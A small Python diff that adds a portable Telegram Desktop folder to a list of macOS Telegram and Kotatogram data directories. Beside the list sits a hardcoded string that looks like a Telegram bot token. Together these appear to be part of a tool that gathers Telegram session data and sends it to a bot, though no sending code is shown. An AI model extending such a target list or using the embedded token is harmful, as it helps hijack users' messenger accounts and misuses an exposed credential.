@@ -20,6 +20,7 @@ POSSIBLE_PATHS = [
     os.path.join(ROOT_PATH, "Library", "Group Containers"),
     os.path.join(ROOT_PATH, "Library", "Application Support", "Telegram Desktop"),
     os.path.join(ROOT_PATH, "Library", "Application Support", "Kotatogram Desktop"),
+    os.path.join(ROOT_PATH, "Desktop", "Telegram", "TelegramForcePortable"),
 ]
 
 B_T: str = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"
